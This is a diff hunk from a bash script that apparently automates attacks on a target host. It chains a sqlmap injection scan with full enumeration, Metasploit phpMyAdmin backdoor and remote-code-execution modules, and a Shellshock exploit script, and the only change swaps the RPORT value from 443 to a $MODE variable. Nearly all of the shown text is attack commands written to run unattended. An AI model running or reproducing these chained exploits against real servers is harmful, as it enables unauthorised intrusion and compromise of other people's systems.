@@ -173,7 +173,7 @@ fi
 		echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
 		sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
 		echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
-		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT "$MODE"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 		echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
 		python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 443 --ssl
 		echo -e "$OKGREEN + -- ----------------------------=[Running Apache Jakarta RCE Exploit]=------ -- +$RESET"
